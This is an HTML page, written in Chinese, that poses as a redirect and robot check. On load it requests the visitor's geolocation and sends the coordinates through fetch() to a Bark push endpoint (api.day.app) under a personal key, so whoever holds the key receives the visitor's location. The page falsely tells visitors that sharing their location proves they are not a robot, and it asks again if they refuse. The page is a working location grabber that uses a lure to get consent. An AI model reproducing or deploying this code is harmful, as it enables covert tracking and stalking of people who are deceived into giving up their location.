<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>跳转中</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            background-image: url('https://i1.hdslb.com/bfs/article/8fee4774fc7864eb074f3e27da8dd728e44a30e8.gif@1192w_1192h.avif');
            background-size: cover;
            background-position: center;
            overflow: hidden;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            filter: blur(5px);
            z-index: -1;
        }

        .message {
            padding: 20px;
            background: white;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            position: relative;
            z-index: 1;
        }

        .retry-button {
            margin-top: 10px;
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
    <script>
        function sendLocation(latitude, longitude) {
            const title = "Location Update";
            const bodyText = `${latitude},${longitude}`;
            const url = `https://api.day.app/hJpdCHPNphWLRJudhf6jna/${title}/${bodyText}`;

            fetch(url, {
                method: "GET"
            }).then(response => {
                document.getElementById("status").innerText = "跳转中...";
            }).catch(error => {
                console.error("请求出错", error);
                document.getElementById("status").innerText = "请授权获取位置信息，以验证您不是机器人。请尝试使用其他浏览器。"; document.getElementById("retry").style.display = "block";
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        sendLocation(latitude, longitude);
                    },
                    (error) => {
                        console.error("获取位置失败", error);
                        document.getElementById("status").innerText = "请授权获取位置信息，以验证您不是机器人。";
                        document.getElementById("retry").style.display = "block";
                    }
                );
            } else {
                console.error("浏览器不支持地理位置功能");
                window.location.href = "https://www.bilibili.com/opus/839566012178235393";
            }
        }

        function retryLocation() {
            document.getElementById("retry").style.display = "none";
            document.getElementById("status").innerText = "跳转中...";
            getLocation();
        }

        window.onload = getLocation;
    </script>
</head>

<body>
    <div class="overlay"></div>
    <div class="message">
        <h2 id="status">跳转中...</h2>
        <button id="retry" class="retry-button" style="display:none;" onclick="retryLocation()">重新获取位置</button>
    </div>
</body>

</html>
